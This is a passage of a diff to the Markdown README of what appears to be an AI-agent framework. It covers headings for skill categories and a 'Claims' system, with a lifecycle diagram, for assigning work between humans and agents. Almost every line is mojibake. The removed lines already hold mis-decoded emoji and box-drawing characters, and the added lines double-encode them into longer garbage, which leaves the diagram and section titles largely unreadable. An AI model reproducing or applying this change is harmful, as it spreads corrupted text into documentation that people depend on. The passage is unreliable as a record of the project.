¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### All 42 Skills by Category
 
 <details open>
-<summary>Ã°Å¸Â§Â  <strong>AgentDB & Memory Skills</strong> Ã¢â‚¬â€ Vector search, learning, optimization</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>AgentDB & Memory Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Vector search, learning, optimization</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4089,7 +4089,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã°Å¸Ââ„¢ <strong>GitHub & DevOps Skills</strong> Ã¢â‚¬â€ PRs, issues, releases, workflows</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â€žÂ¢ <strong>GitHub & DevOps Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â PRs, issues, releases, workflows</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4107,7 +4107,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã¢ËœÂÃ¯Â¸Â <strong>Flow Nexus Skills</strong> Ã¢â‚¬â€ Cloud deployment, neural training</summary>
+<summary>ÃƒÂ¢Ã‹Å“Ã‚ÂÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Flow Nexus Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Cloud deployment, neural training</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4123,7 +4123,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>Intelligence & Learning Skills</strong> Ã¢â‚¬â€ Reasoning, patterns, adaptation</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Intelligence & Learning Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Reasoning, patterns, adaptation</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4139,7 +4139,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â§ <strong>V3 Implementation Skills</strong> Ã¢â‚¬â€ Architecture, security, performance</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ <strong>V3 Implementation Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Architecture, security, performance</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4161,7 +4161,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã°Å¸â€ºÂ Ã¯Â¸Â <strong>Development Workflow Skills</strong> Ã¢â‚¬â€ Pair programming, verification, streaming</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Development Workflow Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Pair programming, verification, streaming</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4183,7 +4183,7 @@ Skills are **reusable workflows** that combine agents, hooks, and patterns into 
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â¬ <strong>Specialized Skills</strong> Ã¢â‚¬â€ Version control, benchmarks, workers</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â¬ <strong>Specialized Skills</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Version control, benchmarks, workers</summary>
 
 | Skill | What It Does | When To Use |
 |-------|--------------|-------------|
@@ -4230,9 +4230,9 @@ Skills are defined in YAML with:
 ---
 
 <details>
-<summary>Ã°Å¸Å½Â« <strong>Claims & Work Coordination</strong> Ã¢â‚¬â€ Human-Agent Task Management</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â« <strong>Claims & Work Coordination</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Human-Agent Task Management</summary>
 
-The Claims system manages **who is working on what** Ã¢â‚¬â€ whether human or agent. It prevents conflicts, enables handoffs, and balances work across your team.
+The Claims system manages **who is working on what** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â whether human or agent. It prevents conflicts, enables handoffs, and balances work across your team.
 
 ### Why Use Claims?
 
@@ -4246,20 +4246,20 @@ The Claims system manages **who is working on what** Ã¢â‚¬â€ whether 
 ### How Claims Work
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                        CLAIMS LIFECYCLE                             Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â   Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š UNCLAIMEDÃ¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š CLAIMED  Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š STEALABLEÃ¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š HANDED OFF  Ã¢â€â€š   Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š         Ã¢â€â€š    Ã¢â€â€š          Ã¢â€â€š    Ã¢â€â€š          Ã¢â€â€š    Ã¢â€â€š             Ã¢â€â€š   Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Open forÃ¢â€â€š    Ã¢â€â€š Agent or Ã¢â€â€š    Ã¢â€â€š Stuck or Ã¢â€â€š    Ã¢â€â€š New owner   Ã¢â€â€š   Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š claimingÃ¢â€â€š    Ã¢â€â€š human    Ã¢â€â€š    Ã¢â€â€š abandonedÃ¢â€â€š    Ã¢â€â€š continues   Ã¢â€â€š   Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ   Ã¢â€â€š
-Ã¢â€â€š       Ã¢â€â€š              Ã¢â€â€š                Ã¢â€â€š               Ã¢â€â€š            Ã¢â€â€š
-Ã¢â€â€š       Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ            Ã¢â€â€š
-Ã¢â€â€š                           COMPLETED                                 Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                        CLAIMS LIFECYCLE                             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
